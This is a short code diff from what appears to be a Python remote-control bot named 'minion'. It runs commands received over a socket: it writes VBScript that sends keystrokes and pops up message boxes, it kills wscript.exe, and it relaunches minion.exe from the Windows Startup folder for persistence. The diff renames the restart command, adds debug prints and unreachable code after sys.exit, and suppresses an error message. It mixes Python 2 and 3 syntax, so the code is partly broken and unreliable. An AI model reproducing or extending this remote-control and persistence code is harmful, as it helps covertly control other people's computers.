@@ -47,8 +47,7 @@ wshshell.sendkeys keyboardtext
                 f.write('MsgBox messageText')
                 f.close
         subprocess.call(["wscript",finalpathm,message[1]])
-
-
+    
     elif "cancel" in str(command1[0]):
         print("Stopping wscript.exe services")
         subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
@@ -170,14 +169,18 @@ loop
             print("File not found")
             pass
 
-    elif "restart" in str(command1[0]):
+    elif "restart101" in str(command1[0]):
         downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
         print("Restarting Minion")
+        print downloadlocation
         try:
             os.startfile(downloadlocation)
             sys.exit()
+            print "done"
         except:
-            print("Not restarting becouse minion isnt installed in startup folder")
+            pass
+            #print("Not restarting becouse minion isnt installed in startup folder")
+            #time.sleep(10)
 
     time.sleep(10)
     s.close()
